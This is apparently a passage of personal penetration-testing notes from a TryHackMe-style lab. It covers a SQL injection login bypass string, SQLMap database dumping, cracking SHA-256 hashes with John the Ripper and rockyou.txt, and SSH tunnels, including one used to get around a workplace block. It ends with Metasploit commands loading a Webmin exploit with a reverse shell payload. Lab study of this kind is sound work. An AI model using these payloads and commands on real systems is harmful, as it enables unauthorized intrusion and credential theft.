You can login using ```' or 1=1 --``` - as your username and leave the password blank.

# Using SQLMap
SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of [Kali Linux](https://tryhackme.com/rooms/kali) or can be manually downloaded and installed [here](https://github.com/sqlmapproject/sqlmap).

There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.
Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using [BurpSuite](https://tryhackme.com/room/learnburp).

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/d42a549b-7a6f-4a2d-881c-089236405633)

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/895c9fe7-f9fe-4301-8f66-3ab2c3ce5f16)

-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

# Cracking a password with JohnTheRipper
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/795d6f40-5039-447f-b46d-1a0224b446d9)

```sh
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

# Exposing services with reverse SSH tunnels
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/5cb8f2b3-d3db-44a2-8c3b-54c99ba773ed)

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ```ssh -L 9000:imgur.com:80 user@example.com```. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.


We will use a tool called ss to investigate sockets running on a host. If we run ```ss -tulpn``` it will tell us what socket connections are running
**Argument	      Description**
-t	            Display TCP sockets
-u	            Display UDP sockets
-l	            Displays only listening sockets
-p	            Shows the process using the socket
-n	            Doesn't resolve service names

# Privilege Escalation Using Metasploit
```sh
msf6> use exploit/unix/webapp/webmin_show_cgi_exec
msf6 exploit(unix/webapp/webmin_show_cgi_exec) >set payload cmd/unix/reverse
```
